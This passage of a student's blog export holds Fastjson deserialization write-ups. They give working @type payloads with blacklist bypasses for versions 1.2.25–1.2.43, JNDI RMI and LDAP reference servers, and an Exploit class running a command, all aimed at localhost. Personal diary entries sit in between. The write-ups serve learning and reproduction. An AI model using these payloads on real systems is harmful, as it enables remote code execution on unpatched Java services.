class="hljs-keyword">catch</span> ( Exception e1 ) &#123;<br>                e1.printStackTrace();<br>            &#125;<br><br>        &#125;<br><br><br>        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="hljs-keyword">throws</span> LDAPException, MalformedURLException &#123;<br>            <span class="hljs-type">URL</span> <span class="hljs-variable">turl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-built_in">this</span>.codebase, <span class="hljs-built_in">this</span>.codebase.getRef().replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>).concat(<span class="hljs-string">&quot;.class&quot;</span>));<br>            System.out.println(<span class="hljs-string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="hljs-string">&quot; redirecting to &quot;</span> + turl);<br>            e.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;Exploit&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cbstring</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.codebase.toString();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">refPos</span> <span class="hljs-operator">=</span> cbstring.indexOf(<span class="hljs-string">&#x27;#&#x27;</span>);<br>            <span class="hljs-keyword">if</span> ( refPos &gt; <span class="hljs-number">0</span> ) &#123;<br>                cbstring = cbstring.substring(<span class="hljs-number">0</span>, refPos);<br>            &#125;<br>            e.addAttribute(<span class="hljs-string">&quot;javaCodeBase&quot;</span>, cbstring);<br>            e.addAttribute(<span class="hljs-string">&quot;objectClass&quot;</span>, <span class="hljs-string">&quot;javaNamingReference&quot;</span>);<br>            e.addAttribute(<span class="hljs-string">&quot;javaFactory&quot;</span>, <span class="hljs-built_in">this</span>.codebase.getRef());<br>            result.sendSearchEntry(e);<br>            result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode.SUCCESS));<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>并且这里因为我本人不了解其代码。这里的恶意类我没有在添加自己的路径。（xsw6a.Exploit），需要重新向phpstudy中传入不带package的恶意类。</strong></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这里其实跟之前利用TemplateImpl利用链子差不多。<strong>这里会调用setter方法触发lookup（）</strong>并且其中的参数可控。之前是会调用getter方法。（这里还是要调试很久，并且有一些类我们是无法跟进去调试的。）</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203082245220.png" alt="QQ截图20220308224443"></p><p>可控<strong>data_source</strong>,触发漏洞。</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,\&quot;properties\&quot;:&#123;\&quot;data_source\&quot;:\&quot;ldap://127.0.0.1:1389/Exploit\&quot;&#125;&#125;&quot;</span>;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Fastjson</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fastjson（1.2.25-1.2.43）</title>
    <link href="/2022/03/08/Fastjson%EF%BC%881-2-25-1-2-43%EF%BC%89/"/>
    <url>/2022/03/08/Fastjson%EF%BC%881-2-25-1-2-43%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Fastjson1-2-25-1-2-43"><a href="#Fastjson1-2-25-1-2-43" class="headerlink" title="Fastjson1.2.25-1.2.43"></a>Fastjson1.2.25-1.2.43</h1><p>在老地方增加了报错。如果是开头两个LL。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203082137161.png" alt="QQ截图20220308213629"></p><p>这里可以直接用之前的版本绕过POC。利用[</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&#125;&quot;</span>;<br></code></pre></td></tr></table></figure><p>over。</p>]]></content>
    
    
    <categories>
      
      <category>Fastjson</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fastjson（1.2.25-1.2.42）</title>
    <link href="/2022/03/08/Fastjson%EF%BC%881-2-25-1-2-42%EF%BC%89/"/>
    <url>/2022/03/08/Fastjson%EF%BC%881-2-25-1-2-42%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Fastjson（1-2-25-1-2-42）"><a href="#Fastjson（1-2-25-1-2-42）" class="headerlink" title="Fastjson（1.2.25-1.2.42）"></a>Fastjson（1.2.25-1.2.42）</h1><p>增加了黑名单。过滤了<strong>L、；</strong><br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203082116245.png" alt="QQ截图20220308210454"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203082128495.png" alt="QQ截图20220308212311"></p><p>但是这里却是一个循环删除。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203082128978.png" alt="QQ截图20220308212625"></p><p>所以没啥用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Fastjson</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fastjson（1.2.25-1.2.41）</title>
    <link href="/2022/03/08/Fastjson%EF%BC%881-2-25-1-2-41%EF%BC%89/"/>
    <url>/2022/03/08/Fastjson%EF%BC%881-2-25-1-2-41%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Fastjson1-2-25-1-2-41"><a href="#Fastjson1-2-25-1-2-41" class="headerlink" title="Fastjson1.2.25-1.2.41"></a>Fastjson1.2.25-1.2.41</h1><p>还是利用之前的代码。</p><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastjsonDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Exploit</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br><br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Exploit</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exploit</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NamingException, AlreadyBoundException &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;xsw6a.Exploit&quot;</span>, <span class="hljs-string">&quot;xsw6a.Exploit&quot;</span>, <span class="hljs-string">&quot;http://127.0.0.1:80&quot;</span>);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference);<br>        registry.bind(<span class="hljs-string">&quot;Exploit&quot;</span>,referenceWrapper);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>还是之前的代码。但是变化了。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081954585.png" alt="QQ截图20220308185949"></p><p>清楚的看到，他是不支持com.sun.rowset.JdbcRowSetImpl。<br>跟进一下代码。<br>一路跟进会在这里产生报错。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081922659.png" alt="QQ截图20220308192105"></p><p>这里很显然禁止了以com.sun开头的类。</p><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081954160.png" alt="QQ截图20220308192640"></p><p>如果这里满足条件也就是开启了<code>autoTypeSupport</code>，实现代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure><p>就会来到这里。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081928989.png" alt="QQ截图20220308192804"></p><p>但是开启之后，这里还是会满足条件。继续进入黑名单。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081932475.png" alt="QQ截图20220308193159"></p><p>去看一下最后的<strong>loadClass</strong>处理类。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081954538.png" alt="QQ截图20220308193309"></p><p>不解释代码了。<strong>一个去头，一个去头去尾。</strong><br>这样就绕过了黑名单。试一试。</p><h2 id="更新换代POC"><a href="#更新换代POC" class="headerlink" title="更新换代POC"></a>更新换代POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br></code></pre></td></tr></table></figure><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>这里在加入<code>[</code>会产生报错。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081951719.png" alt="QQ截图20220308195108"></p><h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&#125;&quot;</span>;<br></code></pre></td></tr></table></figure><p>这应该是一种特殊的格式。不然就会报错。可根据提示来修改。over。</p>]]></content>
    
    
    <categories>
      
      <category>Fastjson</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>致每一个努力的人</title>
    <link href="/2022/03/08/%E8%87%B4%E6%AF%8F%E4%B8%80%E4%B8%AA%E5%8A%AA%E5%8A%9B%E7%9A%84%E4%BA%BA/"/>
    <url>/2022/03/08/%E8%87%B4%E6%AF%8F%E4%B8%80%E4%B8%AA%E5%8A%AA%E5%8A%9B%E7%9A%84%E4%BA%BA/</url>
    
    <content type="html"><![CDATA[<p>、其实越长大就发现想要在一个领域做好，要付出很多。最近学习虽然都是复习之前学的，但是还是学了就忘，手敲代码还是不够熟练。可能确实有些小笨，感觉身边的人一次就学会了。算了也不说这些锤头丧气的话，继续冲！毕竟cuit，夜晚11点多的银兴大道不止只有你。就不花多时间写了。就是简单记录一下。顺便吐槽，密码学老师讲课真的差劲。（我严重怀疑他到底会不会！！！）</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203091323190.jpg"></p><p>还有还有！！今天第一次吃这个东西，没想到还挺好吃。下次回去让婆婆给我做这道菜！！（姑且称它狮子头包蛋。哈哈哈哈哈）<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203091325433.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>历程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>历程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>宝贝女生节快乐</title>
    <link href="/2022/03/08/%E5%AE%9D%E8%B4%9D%E5%A5%B3%E7%94%9F%E8%8A%82%E5%BF%AB%E4%B9%90/"/>
    <url>/2022/03/08/%E5%AE%9D%E8%B4%9D%E5%A5%B3%E7%94%9F%E8%8A%82%E5%BF%AB%E4%B9%90/</url>
    
    <content type="html"><![CDATA[<p>一年一度的三八节到啦。哦豁我得先去上密码学了。待会在来叨叨两句。<br>疫情太难受了，如果不是疫情可能我现在在跟宝贝玩。今天跟宝贝点了杯奶茶，看样子还挺开心得。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203091319667.png" alt="202203081824384"></p><p>离清明节越来越近，感觉好期待一起去峨眉山。<br>最后在祝宝贝女生节快乐哟。</p>]]></content>
    
    
    <categories>
      
      <category>学生时代的爱情</category>
      
    </categories>
    
    
    <tags>
      
      <tag>爱情</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fastjson（JdbcRowSetImpl）</title>
    <link href="/2022/03/08/Fastjson%EF%BC%88JdbcRowSetImpl%EF%BC%89/"/>
    <url>/2022/03/08/Fastjson%EF%BC%88JdbcRowSetImpl%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Fastjson（JNDI-RMI"><a href="#Fastjson（JNDI-RMI" class="headerlink" title="Fastjson（JNDI+RMI)"></a>Fastjson（JNDI+RMI)</h1><p>🐎*的，真就潜入JNDI是不行。手敲还是敲不对！<br>有一说一承认了，要不然不会弄这么久，就是还是没有搞懂JNDI注入。</p><h2 id="JNDIServer"><a href="#JNDIServer" class="headerlink" title="JNDIServer"></a>JNDIServer</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NamingException, AlreadyBoundException &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;Exloit&quot;</span>,<br>                <span class="hljs-string">&quot;xsw6a.Exploit&quot;</span>,<span class="hljs-string">&quot;http://127.0.0.1:80/&quot;</span>);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference);<br>        registry.bind(<span class="hljs-string">&quot;xsw6a.Exploit&quot;</span>,referenceWrapper);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Reference(String className, String factory, String factoryLocation)<br></code></pre></td></tr></table></figure><p>参数1：<code>className</code> - 远程加载时所使用的类名</p><p>参数2：<code>classFactory</code> - 加载的<code>class</code>中需要实例化类的名称</p><p>参数3：<code>classFactoryLocation</code> - 提供<code>classes</code>数据的地址可以是<code>file/ftp/http</code>协议</p><p><strong>并且我们这里注意到Factory命名必须带上包的路径（就是需要完整的路径）。</strong>不然无法复现成功。<br><strong>当然，要把一个对象绑定到<code>RMI注册表</code>中，这个对象需要继承<code>UnicastRemoteObject</code>，但是<code>Reference</code>没有继承它，所以我们还需要封装一下它，用 <code>ReferenceWrapper</code> 包裹一下<code>Reference</code>实例对象，这样就可以将其绑定到<code>RMI注册表</code></strong></p><p>当去访问127.0.0.1&#x2F;Exloit.class的时候找不到。就会去访问我们设置的路径去执行恶意类代码。<strong>并且会调用其中的无参构造函数</strong>，还可以利用java的static代码块来写恶意代码，static代码块的代码在class文件被加载过后就会立即执行，且只执行一次。</p><h1 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h1><p>这里就说关键部分。因为这个很多模块的函数调试不进去。<br>在之前<strong>fastjson基于TemplatesImpl触发链中</strong>，我们直接从这里进去。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081535811.png" alt="QQ截图20220308151631"></p><p>会调试很久很久很久直接来到这里。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081535859.png" alt="QQ截图20220308151706"></p><p>建议直接这里下个断点。位置如下。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081535460.png" alt="QQ截图20220308151802"></p><p>跟进这里又看不到。</p><p>建议直接断点来到这里。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081535780.png" alt="QQ截图20220308152204"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081535322.png" alt="QQ截图20220308152226"></p><p>跟进。**connect()**。来到这里，我们跟进看一下this.getDataSourceName()的值。发现就是我们传入的参数。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081524409.png" alt="QQ截图20220308152417"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081535007.png" alt="QQ截图20220308152402"></p><p>所以就造成了JNDI注入。</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JdbcRowSetImplPoc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] argv)</span>&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/xsw6a.Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br>        JSON.parse(payload);<br><span class="hljs-comment">//        JSON.parseObject(payload);</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="恶意类"><a href="#恶意类" class="headerlink" title="恶意类"></a>恶意类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Exploit</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br><br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Exploit</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exploit</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>记得自己开启一个127.0.0.1:80的服务，并且将恶意类.class放入进去。我的电脑本机python3可以开启服务但是弹不出计算器。不知道原因。</p>]]></content>
    
    
    <categories>
      
      <category>Fastjson</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fastjson（TemplateImpl）</title>
    <link href="/2022/03/07/Fastjson%EF%BC%88TemplateImpl%EF%BC%89/"/>
    <url>/2022/03/07/Fastjson%EF%BC%88TemplateImpl%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Fastjson（TemplatesImp）"><a href="#Fastjson（TemplatesImp）" class="headerlink" title="Fastjson（TemplatesImp）"></a>Fastjson（TemplatesImp）</h1><p>之前好几篇文章都是基于触发恶意类（TemplatesImp）调用getter方法。那么在之前分析的<strong>Fastjson</strong>中在反序列化的时候也会调用getter方法。所以就可以连起来了。</p><p><strong>基于1.2.22-1.2.24版本</strong></p><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><p>弄了我半天，才发现自己的弹计算器的命令输错了。我无语了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastjsonDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        String s=<span 